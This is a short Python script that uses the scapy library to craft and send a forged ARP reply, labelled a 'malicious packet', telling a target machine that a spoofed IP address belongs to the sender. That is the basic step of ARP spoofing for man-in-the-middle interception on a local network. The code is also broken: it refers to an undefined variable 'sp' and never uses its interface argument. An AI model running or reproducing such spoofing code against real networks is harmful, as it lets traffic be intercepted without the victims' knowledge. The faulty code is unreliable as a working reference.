import scapy.all as scapy
import time

def spoofyou(target_ip, spoofed_ip,interface):

    #create the malicious packet
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst= scapy.getmacbyip(target_ip),psrc = sp)

    #send a package
    scapy.send(packet, verbose= False)

